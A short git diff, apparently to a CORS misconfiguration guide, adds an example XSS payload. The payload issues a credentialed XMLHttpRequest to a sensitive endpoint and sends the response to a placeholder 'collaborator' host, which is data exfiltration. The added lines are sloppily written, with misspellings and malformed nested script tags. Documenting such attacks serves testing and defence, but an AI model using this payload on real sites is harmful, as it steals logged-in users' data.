@@ -137,6 +137,10 @@ again.
 
 ```
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+ie:
+<script>
+    document.location="http://vulnerable subdomain=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','endpont having sensitive info',true); req.withCredentials = true;req.send();function reqListener() {location='collaborator/pravin?hancy='%2bthis.responseText; };%3c/script>"
+</script>
 ```
 
 ### Vulnerable Example: Wildcard Origin `*` without Credentials
